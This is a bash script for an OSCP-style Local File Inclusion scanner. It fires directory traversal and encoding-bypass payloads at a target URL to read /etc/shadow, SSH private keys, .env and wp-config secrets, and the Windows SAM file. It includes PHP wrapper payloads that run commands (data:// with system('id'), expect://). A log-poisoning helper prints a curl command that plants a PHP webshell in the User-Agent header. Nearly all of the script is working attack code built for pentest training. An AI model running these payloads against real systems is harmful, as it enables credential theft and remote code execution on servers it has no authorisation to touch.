#!/bin/bash
###############################################################################
#  LFI Scanner — OSCP-friendly
#  Usage: ./lfi_scan.sh <TARGET_URL_WITH_FUZZ> [wordlist]
#
#  Examples:
#    ./lfi_scan.sh "http://192.168.1.10/page.php?file=FUZZ"
#    ./lfi_scan.sh "http://192.168.1.10/index.php?page=FUZZ" /path/to/custom.txt
#    ./lfi_scan.sh "http://192.168.1.10/include.php?lang=FUZZ" auto
#
#  The word FUZZ in the URL is where payloads get injected.
###############################################################################

RED='\033[0;31m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'; YELLOW='\033[1;33m'
BOLD='\033[1m'; NC='\033[0m'

TARGET="${1}"
CUSTOM_WORDLIST="${2}"
OUTDIR="/tmp/lfi_scan_$$"
mkdir -p "$OUTDIR"

if [[ -z "$TARGET" || "$TARGET" != *"FUZZ"* ]]; then
  echo -e "${BOLD}Usage:${NC} $0 <URL_WITH_FUZZ> [wordlist]"
  echo -e "\n${CYAN}Examples:${NC}"
  echo '  ./lfi_scan.sh "http://TARGET/page.php?file=FUZZ"'
  echo '  ./lfi_scan.sh "http://TARGET/index.php?page=FUZZ" custom_lfi.txt'
  echo ""
  echo -e "${YELLOW}Modes:${NC}"
  echo "  1) No wordlist  → runs built-in quick scan + manual payloads"
  echo "  2) Wordlist      → runs ffuf with that wordlist"
  echo '  3) "auto"        → auto-detects best SecLists LFI wordlist'
  exit 1
fi

section() { echo -e "\n${BOLD}${CYAN}═══════════════════════════════════════${NC}"; echo -e "${BOLD}${CYAN}  $1${NC}"; echo -e "${BOLD}${CYAN}═══════════════════════════════════════${NC}"; }

###############################################################################
#  1. BUILT-IN LFI PAYLOADS (from PEN-200 notes)
###############################################################################

# Core traversal payloads
TRAVERSAL_PAYLOADS=(
  # Basic traversal
  "../../../../../../../etc/passwd"
  "../../../../../../../../etc/passwd"
  "../../../../../../../etc/shadow"
  "../../../../../../../etc/hosts"
  "../../../../../../../etc/crontab"
  "../../../../../../../etc/sudoers"
  "../../../../../../../home/*/.ssh/id_rsa"
  "../../../../../../../root/.ssh/id_rsa"
  "../../../../../../../proc/self/environ"
  "../../../../../../../var/log/apache2/access.log"
  "../../../../../../../var/log/auth.log"

  # Bypass: double-dot (strip ../ once)
  "....//....//....//....//etc/passwd"
  "....//....//....//....//etc/shadow"

  # Bypass: URL-encoded
  "..%2f..%2f..%2f..%2f..%2fetc/passwd"
  "..%2f..%2f..%2f..%2f..%2fetc/shadow"

  # Bypass: double URL-encoded
  "..%252f..%252f..%252f..%252fetc/passwd"

  # Bypass: overlong UTF-8
  "..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd"

  # Bypass: full URL-encoded dots+slashes
  "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"

  # Null byte (PHP < 5.3.4)
  "../../../../../../../etc/passwd%00"

  # Windows targets
  "..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
  "....\\....\\....\\....\\windows\\system32\\drivers\\etc\\hosts"
  "..%5c..%5c..%5c..%5c..%5cwindows/system32/drivers/etc/hosts"

  # Common config files
  "../../../../../../../etc/redis/redis.conf"
  "../../../../../../../etc/grafana/grafana.ini"
  "../../../../../../../var/www/html/wp-config.php"
  "../../../../../../../var/www/html/config.php"
  "../../../../../../../var/www/html/.env"
  "../../../../../../../etc/vsftpd.conf"
  "../../../../../../../etc/exports"
  "../../../../../../../etc/snmp/snmpd.local.conf"
  "../../../../../../../etc/openfire/openfire.xml"
)

# PHP wrapper payloads
PHP_WRAPPER_PAYLOADS=(
  # php://filter — read source code as base64
  "php://filter/convert.base64-encode/resource=index.php"
  "php://filter/convert.base64-encode/resource=config.php"
  "php://filter/convert.base64-encode/resource=db.php"
  "php://filter/convert.base64-encode/resource=../config.php"
  "php://filter/convert.base64-encode/resource=.env"
  "php://filter/convert.base64-encode/resource=wp-config.php"
  "php://filter/convert.base64-encode/resource=../wp-config.php"

  # data:// — inline code exec (if allow_url_include=On)
  "data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOyA/Pg=="

  # expect:// — direct command exec (rare but worth trying)
  "expect://id"
)

###############################################################################
#  2. QUICK SCAN (curl-based, no dependencies)
###############################################################################

quick_scan() {
  section "Quick LFI Scan (curl)"

  # Extract base URL (replace FUZZ with payload)
  local hits=0 total=0

  echo -e "${YELLOW}[*] Testing ${#TRAVERSAL_PAYLOADS[@]} traversal payloads...${NC}\n"

  for payload in "${TRAVERSAL_PAYLOADS[@]}"; do
    ((total++))
    local url="${TARGET//FUZZ/$payload}"
    local resp
    resp=$(curl -sk --max-time 5 "$url" 2>/dev/null)
    local code
    code=$(curl -sk -o /dev/null -w '%{http_code}' --max-time 5 "$url" 2>/dev/null)

    # Check for success indicators
    if echo "$resp" | grep -qiE 'root:x:0|root:.*:0:0|PRIVATE KEY|password.*=|DB_PASSWORD|mysql|redis'; then
      echo -e "  ${GREEN}[HIT]${NC} ${code} | ${payload}"
      echo "$resp" > "${OUTDIR}/hit_${total}.txt"
      echo -e "       ${CYAN}→ saved: ${OUTDIR}/hit_${total}.txt${NC}"
      ((hits++))
    else
      # Show 200s that might be interesting
      if [[ "$code" == "200" ]]; then
        local size=${#resp}
        # Skip if response is same size as baseline (likely error page)
        printf "  ${YELLOW}[200]${NC} %6d bytes | %s\n" "$size" "$payload"
      fi
    fi
  done

  echo -e "\n${YELLOW}[*] Testing ${#PHP_WRAPPER_PAYLOADS[@]} PHP wrapper payloads...${NC}\n"

  for payload in "${PHP_WRAPPER_PAYLOADS[@]}"; do
    ((total++))
    local url="${TARGET//FUZZ/$payload}"
    local resp
    resp=$(curl -sk --max-time 5 "$url" 2>/dev/null)
    local code
    code=$(curl -sk -o /dev/null -w '%{http_code}' --max-time 5 "$url" 2>/dev/null)

    if [[ "$code" == "200" ]] && [[ ${#resp} -gt 0 ]]; then
      # Check if base64 response (php://filter hit)
      if echo "$resp" | grep -qP '^[A-Za-z0-9+/=]{20,}'; then
        echo -e "  ${GREEN}[HIT]${NC} ${code} | ${payload}"
        echo "$resp" | base64 -d 2>/dev/null > "${OUTDIR}/decoded_${total}.php"
        echo -e "       ${CYAN}→ decoded: ${OUTDIR}/decoded_${total}.php${NC}"
        ((hits++))
      elif echo "$resp" | grep -qiE 'uid=|gid=|root'; then
        echo -e "  ${GREEN}[HIT]${NC} ${code} | ${payload} ${RED}(RCE!)${NC}"
        ((hits++))
      else
        local size=${#resp}
        printf "  ${YELLOW}[200]${NC} %6d bytes | %s\n" "$size" "$payload"
      fi
    fi
  done

  echo -e "\n${BOLD}Results: ${GREEN}${hits} hits${NC} / ${total} tested"
  echo -e "Output dir: ${CYAN}${OUTDIR}${NC}"
}

###############################################################################
#  3. FFUF SCAN
###############################################################################

ffuf_scan() {
  local wordlist="$1"

  if ! command -v ffuf &>/dev/null; then
    echo -e "${RED}[!] ffuf not found. Install: sudo apt install ffuf${NC}"
    echo -e "${YELLOW}[*] Falling back to quick scan...${NC}"
    quick_scan
    return
  fi

  section "ffuf LFI Scan"

  # Auto-detect wordlist
  if [[ "$wordlist" == "auto" || -z "$wordlist" ]]; then
    local candidates=(
      "/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt"
      "/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt"
      "/usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt"
      "/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt"
      "/opt/seclists/Fuzzing/LFI/LFI-Jhaddix.txt"
    )
    for wl in "${candidates[@]}"; do
      if [[ -f "$wl" ]]; then
        wordlist="$wl"
        break
      fi
    done
  fi

  if [[ ! -f "$wordlist" ]]; then
    echo -e "${RED}[!] Wordlist not found: ${wordlist}${NC}"
    echo -e "${YELLOW}[*] Generating built-in wordlist...${NC}"
    wordlist="${OUTDIR}/lfi_payloads.txt"
    generate_wordlist > "$wordlist"
    echo -e "${GREEN}[+] Generated ${NC}$(wc -l < "$wordlist")${GREEN} payloads${NC}"
  fi

  echo -e "${CYAN}[*] Wordlist: ${wordlist}${NC}"
  echo -e "${CYAN}[*] Target:   ${TARGET}${NC}\n"

  # Step 1: Get baseline response size to filter
  local baseline_url="${TARGET//FUZZ/nonexistentfile12345}"
  local baseline_size
  baseline_size=$(curl -sk -o /dev/null -w '%{size_download}' --max-time 5 "$baseline_url" 2>/dev/null)

  echo -e "${YELLOW}[*] Baseline response size: ${baseline_size} bytes (filtering this)${NC}\n"

  # Run ffuf
  ffuf -u "$TARGET" \
    -w "$wordlist" \
    -t 40 \
    -c \
    -fs "$baseline_size" \
    -mc 200,301,302 \
    -o "${OUTDIR}/ffuf_results.json" \
    -of json \
    2>&1

  echo -e "\n${GREEN}[+] Results saved: ${OUTDIR}/ffuf_results.json${NC}"

  # Parse hits
  if [[ -f "${OUTDIR}/ffuf_results.json" ]]; then
    local hit_count
    hit_count=$(python3 -c "import json; d=json.load(open('${OUTDIR}/ffuf_results.json')); print(len(d.get('results',[])))" 2>/dev/null || echo "0")
    echo -e "${BOLD}Total ffuf hits: ${GREEN}${hit_count}${NC}"
  fi
}

###############################################################################
#  4. GENERATE WORDLIST (if no SecLists available)
###############################################################################

generate_wordlist() {
  # All built-in payloads
  for p in "${TRAVERSAL_PAYLOADS[@]}"; do echo "$p"; done
  for p in "${PHP_WRAPPER_PAYLOADS[@]}"; do echo "$p"; done

  # Generate depth variants
  local files=("etc/passwd" "etc/shadow" "etc/hosts" "etc/crontab"
    "etc/sudoers" "etc/exports" "etc/redis/redis.conf"
    "proc/self/environ" "var/log/apache2/access.log"
    "var/www/html/wp-config.php" "var/www/html/config.php"
    "var/www/html/.env" "root/.ssh/id_rsa" "root/.ssh/authorized_keys")

  for f in "${files[@]}"; do
    for depth in 1 2 3 4 5 6 7 8; do
      local prefix=""
      for ((i=0; i<depth; i++)); do prefix="../${prefix}"; done
      echo "${prefix}${f}"
      # URL-encoded variant
      local enc_prefix=""
      for ((i=0; i<depth; i++)); do enc_prefix="..%2f${enc_prefix}"; done
      echo "${enc_prefix}${f}"
    done
    # Null byte variants
    echo "../../../../../../../${f}%00"
    echo "../../../../../../../${f}%00.php"
    echo "../../../../../../../${f}%00.html"
  done

  # Windows paths
  local winfiles=("windows/system32/drivers/etc/hosts"
    "windows/win.ini" "windows/system.ini"
    "windows/system32/config/SAM"
    "inetpub/wwwroot/web.config"
    "xampp/apache/conf/httpd.conf")

  for f in "${winfiles[@]}"; do
    for depth in 1 2 3 4 5 6 7 8; do
      local prefix=""
      for ((i=0; i<depth; i++)); do prefix="..\\${prefix}"; done
      echo "${prefix}${f}"
      prefix=""
      for ((i=0; i<depth; i++)); do prefix="..%5c${prefix}"; done
      echo "${prefix}${f}"
    done
  done
}

###############################################################################
#  5. LOG POISONING helper
###############################################################################

log_poison() {
  local base_url="${TARGET%%\?*}"  # strip params
  section "Log Poisoning Setup"

  echo -e "${YELLOW}[1] Poisoning Apache access log with PHP webshell in User-Agent...${NC}"
  echo -e "    curl -A '<?php system(\$_GET[\"c\"]); ?>' ${base_url}"

  echo -e "\n${YELLOW}[2] Then include the log via LFI:${NC}"
  echo -e "    ${TARGET//FUZZ/..\/..\/..\/..\/..\/..\/var\/log\/apache2\/access.log}&c=id"

  echo -e "\n${YELLOW}[3] Common log paths to try:${NC}"
  local logs=(
    "/var/log/apache2/access.log"
    "/var/log/apache/access.log"
    "/var/log/httpd/access_log"
    "/var/log/nginx/access.log"
    "/var/log/auth.log"
    "/var/log/mail.log"
    "/proc/self/environ"
    "/proc/self/fd/0"
  )
  for log in "${logs[@]}"; do
    echo -e "    ../../../../../../../${log}"
  done
}

###############################################################################
#  CLI
###############################################################################

echo -e "${BOLD}${CYAN}"
echo "╔══════════════════════════════════════════════════╗"
echo "║  LFI Scanner — OSCP Edition                     ║"
echo "╚══════════════════════════════════════════════════╝"
echo -e "${NC}"

case "${2:-quick}" in
  quick|"")
    quick_scan
    echo ""
    section "Next Steps"
    echo -e "  ${GREEN}1.${NC} Run with ffuf:  $0 \"$TARGET\" auto"
    echo -e "  ${GREEN}2.${NC} Log poisoning:  $0 \"$TARGET\" poison"
    echo -e "  ${GREEN}3.${NC} Custom list:    $0 \"$TARGET\" /path/to/wordlist.txt"
    ;;
  auto)
    ffuf_scan "auto"
    ;;
  poison)
    log_poison
    ;;
  generate)
    generate_wordlist
    ;;
  *)
    if [[ -f "$2" ]]; then
      ffuf_scan "$2"
    else
      echo -e "${RED}[!] File not found: $2${NC}"
      echo -e "${YELLOW}Try: $0 \"$TARGET\" auto${NC}"
      exit 1
    fi
    ;;
esac

echo -e "\n${CYAN}Output: ${OUTDIR}${NC}"
